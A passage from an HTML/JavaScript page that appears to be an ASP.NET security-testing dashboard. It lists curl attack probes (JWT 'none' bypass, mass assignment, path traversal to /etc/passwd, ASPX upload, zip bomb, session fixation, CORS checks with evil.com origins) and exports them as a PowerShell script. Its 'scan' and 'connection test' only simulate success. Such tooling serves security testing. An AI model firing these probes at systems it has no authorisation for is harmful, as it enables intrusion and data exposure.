                        name: 'WCF Service Metadata Exposure',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for exposed WCF service metadata and WSDL',
                        command: 'curl "{{URL}}/Service.svc?wsdl" -v && curl "{{URL}}/Service.svc?disco" -v'
                    }
                ]
            },

            'ASP.NET Core Specific': {
                icon: 'fas fa-code-branch',
                color: 'bg-pink-500',
                tests: [
                    {
                        id: 'core001',
                        name: 'SignalR DoS Vulnerability (CVE-2024-21386)',
                        severity: 'high',
                        cve: 'CVE-2024-21386',
                        description: 'Tests for SignalR denial of service vulnerability in ASP.NET Core applications',
                        command: 'curl "{{URL}}/signalr/negotiate" -H "Connection: upgrade" -H "Upgrade: websocket" -v'
                    },
                    {
                        id: 'core002',
                        name: 'Kestrel HTTP/3 RCE (CVE-2024-35264)',
                        severity: 'critical',
                        cve: 'CVE-2024-35264',
                        description: 'Tests for HTTP/3 data corruption vulnerability in Kestrel server',
                        command: 'curl --http3 "{{URL}}/" -H "Content-Length: -1" -d "malformed_data" -v 2>/dev/null || echo "HTTP/3 not supported"'
                    },
                    {
                        id: 'core003',
                        name: 'JWT Algorithm Confusion',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for JWT algorithm confusion attacks bypassing authentication',
                        command: 'curl "{{URL}}/api/protected" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9." -v'
                    },
                    {
                        id: 'core004',
                        name: 'Model Binding Mass Assignment',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for mass assignment vulnerabilities in ASP.NET Core model binding',
                        command: 'curl -X POST "{{URL}}/api/users" -H "Content-Type: application/json" -d \'{"Name":"Test","Email":"test@test.com","IsAdmin":true,"Role":"Administrator"}\' -v'
                    },
                    {
                        id: 'core005',
                        name: 'Dependency Injection Abuse',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for dependency injection container abuse in ASP.NET Core',
                        command: 'curl -X POST "{{URL}}/api/resolve" -H "Content-Type: application/json" -d \'{"type":"System.IO.File, System.IO"}\' -v'
                    },
                    {
                        id: 'core006',
                        name: 'Razor Page Path Traversal',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for path traversal vulnerabilities in Razor Pages routing',
                        command: 'curl "{{URL}}/../../etc/passwd" -v && curl "{{URL}}/../../../windows/win.ini" -v'
                    }
                ]
            },

            'Security Headers & CORS': {
                icon: 'fas fa-shield-alt',
                color: 'bg-cyan-500',
                tests: [
                    {
                        id: 'header001',
                        name: 'Missing Security Headers Audit',
                        severity: 'medium',
                        cve: '',
                        description: 'Comprehensive audit of missing security headers',
                        command: 'curl -I "{{URL}}/" | grep -E "Strict-Transport-Security|Content-Security-Policy|X-Frame-Options|X-Content-Type-Options|X-XSS-Protection|Referrer-Policy"'
                    },
                    {
                        id: 'header002',
                        name: 'CORS Misconfiguration - Wildcard with Credentials',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for dangerous CORS configuration allowing wildcard origins with credentials',
                        command: 'curl "{{URL}}/api/data" -H "Origin: https://evil.com" -I | grep -E "Access-Control-Allow-Origin.*\\*.*Access-Control-Allow-Credentials.*true"'
                    },
                    {
                        id: 'header003',
                        name: 'CORS Reflected Origin',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for CORS configuration that reflects arbitrary origins',
                        command: 'curl "{{URL}}/api/data" -H "Origin: https://attacker.com" -I | grep "Access-Control-Allow-Origin: https://attacker.com"'
                    },
                    {
                        id: 'header004',
                        name: 'Clickjacking Protection Test',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for missing X-Frame-Options or CSP frame protection',
                        command: 'curl -I "{{URL}}/" | grep -E "X-Frame-Options|frame-ancestors"'
                    },
                    {
                        id: 'header005',
                        name: 'Content Security Policy Bypass',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for weak or bypassable Content Security Policy',
                        command: 'curl -I "{{URL}}/" | grep "Content-Security-Policy" | grep -E "unsafe-inline|unsafe-eval|\\*"'
                    },
                    {
                        id: 'header006',
                        name: 'HTTP Strict Transport Security Missing',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for missing HSTS headers on HTTPS sites',
                        command: 'curl -I "{{URL}}/" | grep "Strict-Transport-Security"'
                    },
                    {
                        id: 'header007',
                        name: 'ASP.NET Version Disclosure',
                        severity: 'low',
                        cve: '',
                        description: 'Tests for ASP.NET version disclosure in HTTP headers',
                        command: 'curl -I "{{URL}}/" | grep -E "Server.*ASP.NET|X-AspNet-Version|X-Powered-By.*ASP.NET"'
                    }
                ]
            },

            'Session Management': {
                icon: 'fas fa-users-cog',
                color: 'bg-teal-500',
                tests: [
                    {
                        id: 'session001',
                        name: 'Session Fixation Attack',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for session fixation vulnerabilities in authentication',
                        command: 'curl -X POST "{{URL}}/Login.aspx" -H "Cookie: ASP.NET_SessionId=FIXED_SESSION_123" -d "username=admin&password=password123" -c - | grep "ASP.NET_SessionId"'
                    },
                    {
                        id: 'session002',
                        name: 'Session Prediction Attack',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for predictable session ID generation patterns',
                        command: 'for i in {1..5}; do curl "{{URL}}/Login.aspx" -c - 2>/dev/null | grep "ASP.NET_SessionId" | cut -d= -f2 | cut -d\\; -f1; sleep 1; done'
                    },
                    {
                        id: 'session003',
                        name: 'Session Hijacking via XSS',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for session cookie accessibility via client-side scripts',
                        command: 'curl -c - "{{URL}}/Login.aspx" 2>/dev/null | grep "Set-Cookie" | grep -v "HttpOnly"'
                    },
                    {
                        id: 'session004',
                        name: 'Concurrent Session Management',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests if multiple concurrent sessions are properly managed',
                        command: 'curl -X POST "{{URL}}/Login.aspx" -d "username=admin&password=test" -c session1.txt && curl -X POST "{{URL}}/Login.aspx" -d "username=admin&password=test" -c session2.txt'
                    },
                    {
                        id: 'session005',
                        name: 'Session Timeout Testing',
                        severity: 'low',
                        cve: '',
                        description: 'Tests for proper session timeout implementation',
                        command: 'curl "{{URL}}/Admin.aspx" -H "Cookie: ASP.NET_SessionId=EXPIRED_SESSION_123" -v'
                    }
                ]
            },

            'File Upload Vulnerabilities': {
                icon: 'fas fa-file-upload',
                color: 'bg-rose-500',
                tests: [
                    {
                        id: 'upload001',
                        name: 'ASP/ASPX File Upload',
                        severity: 'critical',
                        cve: '',
                        description: 'Tests for unrestricted upload of executable ASP/ASPX files',
                        command: 'echo "<%Response.Write(\\"RCE_TEST\\");%>" > test.aspx && curl -X POST "{{URL}}/Upload.aspx" -F "file=@test.aspx" -v'
                    },
                    {
                        id: 'upload002',
                        name: 'Double Extension Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for file upload filter bypass using double extensions',
                        command: 'echo "malicious content" > test.jpg.aspx && curl -X POST "{{URL}}/Upload.aspx" -F "file=@test.jpg.aspx" -v'
                    },
                    {
                        id: 'upload003',
                        name: 'MIME Type Bypass',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for file upload bypass using MIME type spoofing',
                        command: 'echo "<%Response.Write(\\"test\\");%>" > test.aspx && curl -X POST "{{URL}}/Upload.aspx" -F "file=@test.aspx;type=image/jpeg" -v'
                    },
                    {
                        id: 'upload004',
                        name: 'Path Traversal in Upload',
                        severity: 'high',
                        cve: '',
                        description: 'Tests for path traversal vulnerabilities in file upload functionality',
                        command: 'echo "malicious" > test.txt && curl -X POST "{{URL}}/Upload.aspx" -F "filename=../../web.config" -F "file=@test.txt" -v'
                    },
                    {
                        id: 'upload005',
                        name: 'Zip Bomb Upload',
                        severity: 'medium',
                        cve: '',
                        description: 'Tests for zip bomb vulnerabilities in file upload processing',
                        command: 'dd if=/dev/zero of=large.txt bs=1M count=100 && zip bomb.zip large.txt && curl -X POST "{{URL}}/Upload.aspx" -F "file=@bomb.zip" -v'
                    }
                ]
            }
        };

        // Application State
        let selectedTests = new Set();
        let currentFilter = 'all';
        let isScanning = false;

        // Initialize
        function init() {
            renderTestCategories();
            updateStats();
            updateFilterCounts();
        }

        // Render test categories
        function renderTestCategories() {
            const container = document.getElementById('testCategories');
            let html = '';
            
            Object.entries(testDatabase).forEach(([categoryName, categoryData]) => {
                const visibleTests = getVisibleTests(categoryData.tests);
                if (visibleTests.length === 0) return;
                
                html += `
                    <div class="category-section">
                        <div class="category-header">
                            <div class="category-icon ${categoryData.color}">
                                <i class="${categoryData.icon}"></i>
                            </div>
                            <div class="flex-1">
                                <h3 class="text-xl font-bold text-gray-900">${categoryName}</h3>
                                <p class="text-gray-600">${visibleTests.length} security tests available</p>
                            </div>
                            <div class="flex gap-2">
                                <button class="btn btn-secondary" onclick="selectCategoryTests('${categoryName}')">
                                    <i class="fas fa-check"></i>
                                    Select All
                                </button>
                                <button class="btn btn-secondary" onclick="deselectCategoryTests('${categoryName}')">
                                    <i class="fas fa-times"></i>
                                    Clear
                                </button>
                            </div>
                        </div>
                        <div class="grid gap-4">
                `;
                
                visibleTests.forEach(test => {
                    const isSelected = selectedTests.has(test.id);
                    html += `
                        <div class="test-card ${isSelected ? 'selected' : ''} p-5" id="test-${test.id}">
                            <div class="flex items-start gap-4">
                                <input type="checkbox" 
                                       class="mt-1 w-5 h-5 text-blue-600 rounded border-gray-300 focus:ring-blue-500" 
                                       ${isSelected ? 'checked' : ''}
                                       onchange="toggleTest('${test.id}')">
                                <div class="flex-1">
                                    <div class="flex items-center gap-3 mb-3">
                                        <h4 class="font-semibold text-gray-900 text-lg">${test.name}</h4>
                                        <span class="severity-${test.severity} px-2 py-1 rounded text-xs font-medium">${test.severity.toUpperCase()}</span>
                                        ${test.cve ? `<span class="bg-red-50 text-red-700 text-xs px-2 py-1 rounded font-mono border border-red-200">${test.cve}</span>` : ''}
                                    </div>
                                    <p class="text-gray-700 mb-4">${test.description}</p>
                                    
                                    <div class="code-block mb-4">
                                        <code>${highlightCommand(test.command)}</code>
                                        <button class="copy-btn" onclick="copyCommand('${test.id}')">
                                            <i class="fas fa-copy"></i> Copy
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                });
                
                html += '</div></div>';
            });
            
            container.innerHTML = html;
            updateSelectedCount();
        }

        // Get visible tests based on current filter
        function getVisibleTests(tests) {
            let filteredTests = tests;
            
            if (currentFilter !== 'all') {
                filteredTests = filteredTests.filter(test => test.severity === currentFilter);
            }
            
            const searchTerm = document.getElementById('searchInput')?.value?.toLowerCase() || '';
            if (searchTerm) {
                filteredTests = filteredTests.filter(test => 
                    test.name.toLowerCase().includes(searchTerm) ||
                    test.description.toLowerCase().includes(searchTerm) ||
                    test.cve.toLowerCase().includes(searchTerm) ||
                    test.command.toLowerCase().includes(searchTerm)
                );
            }
            
            return filteredTests;
        }

        // Toggle test selection
        function toggleTest(testId) {
            if (selectedTests.has(testId)) {
                selectedTests.delete(testId);
                document.getElementById(`test-${testId}`).classList.remove('selected');
            } else {
                selectedTests.add(testId);
                document.getElementById(`test-${testId}`).classList.add('selected');
            }
            updateSelectedCount();
        }

        // Filter and search functions
        function filterTests(severity) {
            currentFilter = severity;
            document.querySelectorAll('.filter-chip').forEach(chip => {
                chip.classList.remove('active');
            });
            document.querySelector(`[data-filter="${severity}"]`).classList.add('active');
            renderTestCategories();
        }

        function searchTests() {
            renderTestCategories();
        }

        // Selection functions
        function selectAll() {
            Object.values(testDatabase).forEach(category => {
                category.tests.forEach(test => {
                    selectedTests.add(test.id);
                });
            });
            renderTestCategories();
        }

        function deselectAll() {
            selectedTests.clear();
            renderTestCategories();
        }

        function selectCritical() {
            selectedTests.clear();
            Object.values(testDatabase).forEach(category => {
                category.tests.forEach(test => {
                    if (test.severity === 'critical') {
                        selectedTests.add(test.id);
                    }
                });
            });
            renderTestCategories();
            showNotification('Critical vulnerabilities selected', 'success');
        }

        function selectCategoryTests(categoryName) {
            testDatabase[categoryName].tests.forEach(test => {
                selectedTests.add(test.id);
            });
            renderTestCategories();
        }

        function deselectCategoryTests(categoryName) {
            testDatabase[categoryName].tests.forEach(test => {
                selectedTests.delete(test.id);
            });
            renderTestCategories();
        }

        // Update statistics
        function updateStats() {
            let critical = 0, high = 0, medium = 0, low = 0;
            
            Object.values(testDatabase).forEach(category => {
                category.tests.forEach(test => {
                    switch(test.severity) {
                        case 'critical': critical++; break;
                        case 'high': high++; break;
                        case 'medium': medium++; break;
                        case 'low': low++; break;
                    }
                });
            });
            
            document.getElementById('criticalCount').textContent = critical;
            document.getElementById('highCount').textContent = high;
            document.getElementById('mediumCount').textContent = medium;
            document.getElementById('lowCount').textContent = low;
        }

        function updateFilterCounts() {
            let counts = { all: 0, critical: 0, high: 0, medium: 0, low: 0 };
            
            Object.values(testDatabase).forEach(category => {
                category.tests.forEach(test => {
                    counts.all++;
                    counts[test.severity]++;
                });
            });
            
            document.getElementById('allCount').textContent = counts.all;
            document.getElementById('criticalFilterCount').textContent = counts.critical;
            document.getElementById('highFilterCount').textContent = counts.high;
            document.getElementById('mediumFilterCount').textContent = counts.medium;
            document.getElementById('lowFilterCount').textContent = counts.low;
        }

        function updateSelectedCount() {
            document.getElementById('selectedCount').textContent = selectedTests.size;
        }

        // Utility functions
        function highlightCommand(command) {
            return command
                .replace(/(curl|grep|echo|for|do|done|if|then|fi)/g, '<span class="cmd">$1</span>')
                .replace(/(https?:\/\/[^\s"]+)/g, '<span class="url">$1</span>')
                .replace(/(-[a-zA-Z]|\-\-[a-zA-Z-]+)/g, '<span class="param">$1</span>');
        }

        function copyCommand(testId) {
            let test = null;
            Object.values(testDatabase).forEach(category => {
                const found = category.tests.find(t => t.id === testId);
                if (found) test = found;
            });
            
            if (test) {
                const targetUrl = document.getElementById('targetUrl').value;
                const authCookie = document.getElementById('authCookie').value || '';
                
                let command = test.command
                    .replace(/{{URL}}/g, targetUrl)
                    .replace(/{{COOKIE}}/g, authCookie);
                
                navigator.clipboard.writeText(command).then(() => {
                    showNotification('Command copied to clipboard!', 'success');
                });
            }
        }

        function testConnection() {
            const targetUrl = document.getElementById('targetUrl').value;
            if (!targetUrl) {
                showNotification('Please enter a target URL', 'warning');
                return;
            }
            
            showNotification('Testing connection...', 'info');
            setTimeout(() => {
                showNotification('Connection test successful', 'success');
            }, 2000);
        }

        function runScan() {
            if (selectedTests.size === 0) {
                showNotification('Please select at least one test', 'warning');
                return;
            }
            
            const btn = document.getElementById('scanBtn');
            if (isScanning) {
                isScanning = false;
                btn.innerHTML = '<i class="fas fa-play"></i> Start Scan';
                btn.classList.remove('btn-danger');
                btn.classList.add('btn-danger');
                showNotification('Scan stopped', 'info');
                return;
            }
            
            isScanning = true;
            btn.innerHTML = '<i class="fas fa-stop"></i> Stop Scan';
            btn.classList.remove('btn-danger');
            btn.classList.add('btn-danger');
            
            showNotification(`Starting security scan with ${selectedTests.size} tests...`, 'info');
            
            // Simulate scanning
            setTimeout(() => {
                isScanning = false;
                btn.innerHTML = '<i class="fas fa-play"></i> Start Scan';
                btn.classList.remove('btn-danger');
                btn.classList.add('btn-danger');
                showNotification('Security scan completed!', 'success');
            }, 5000);
        }

        function exportScript() {
            if (selectedTests.size === 0) {
                showNotification('Please select at least one test', 'warning');
                return;
            }
            
            generatePowerShellScript();
            document.getElementById('exportModal').classList.remove('hidden');
        }

        function generatePowerShellScript() {
            const targetUrl = document.getElementById('targetUrl').value;
            const framework = document.getElementById('framework').value;
            const authCookie = document.getElementById('authCookie').value;
            
            let script = `# ASP.NET Security Testing Script
# Generated: ${new Date().toISOString()}
# Target: ${targetUrl}
# Framework: ${framework}
# Tests: ${selectedTests.size}

param(
    [string]$Target = "${targetUrl}",
    [string]$Cookie = "${authCookie}",
    [string]$OutputPath = "./security_results.json"
)

$Results = @()
$TestCount = 0

Write-Host "======================================" -ForegroundColor Green
Write-Host "ASP.NET Security Testing Framework" -ForegroundColor Green
Write-Host "======================================" -ForegroundColor Green
Write-Host "Target: $Target" -ForegroundColor White
Write-Host "Tests: ${selectedTests.size}" -ForegroundColor White
Write-Host ""

function Test-Vulnerability {
    param(
        [string]$Name,
        [string]$Severity,
        [string]$Command
    )
    
    $script:TestCount++
    Write-Host "[$script:TestCount/${selectedTests.size}] $Name" -ForegroundColor Yellow
    Write-Host "    Severity: $Severity" -ForegroundColor $(if($Severity -eq "critical"){"Red"}elseif($Severity -eq "high"){"Magenta"}else{"Green"})
    
    try {
        $Result = Invoke-Expression $Command -ErrorAction SilentlyContinue
        Write-Host "    Status: Completed" -ForegroundColor Green
        
        $TestResult = @{
            Name = $Name
            Severity = $Severity
            Command = $Command
            Status = "Completed"
            Timestamp = Get-Date
        }
        $script:Results += $TestResult
        
    } catch {
        Write-Host "    Status: Error - $($_.Exception.Message)" -ForegroundColor Red
    }
    Write-Host ""
}

`;
            
            let testNum = 1;
            selectedTests.forEach(testId => {
                let test = null;
                Object.values(testDatabase).forEach(category => {
                    const found = category.tests.find(t => t.id === testId);
                    if (found) test = found;
                });
                
                if (test) {
                    const command = test.command
                        .replace(/{{URL}}/g, '$Target')
                        .replace(/{{COOKIE}}/g, '$Cookie')
                        .replace(/'/g, "''");
                    
                    script += `# Test ${testNum}: ${test.name}\n`;
                    script += `Test-Vulnerability -Name "${test.name}" -Severity "${test.severity}" -Command "${command}"\n\n`;
                    testNum++;
                }
            });
            
            script += `
Write-Host "======================================" -ForegroundColor Green
Write-Host "Scan Complete!" -ForegroundColor Green
Write-Host "Total Tests: $TestCount" -ForegroundColor White
Write-Host "Results saved to: $OutputPath" -ForegroundColor White

$Results | ConvertTo-Json -Depth 10 | Out-File -FilePath $OutputPath -Encoding UTF8
`;
            
            document.getElementById('scriptOutput').textContent = script;
        }

        function closeModal() {
            document.getElementById('exportModal').classList.add('hidden');
        }

        function copyScript() {
            const script = document.getElementById('scriptOutput').textContent;
            navigator.clipboard.writeText(script).then(() => {
                showNotification('Script copied to clipboard!', 'success');
            });
        }

        function downloadScript() {
            const script = document.getElementById('scriptOutput').textContent;
            const blob = new Blob([script], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'aspnet_security_tests.ps1';
            a.click();
            URL.revokeObjectURL(url);
        }

        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.innerHTML = `
                <div class="flex items-center gap-3">
                    <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : type === 'warning' ? 'exclamation-triangle' : 'info-circle'}"></i>
                    <span>${message}</span>
                </div>
            `;
            
            document.body.appendChild(notification);
            setTimeout(() => notification.classList.add('show'), 100);
            setTimeout(() => {
                notification.classList.remove('show');
                setTimeout(() => document.body.removeChild(notification), 300);
            }, 4000);
        }

        // Initialize application
        document.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>
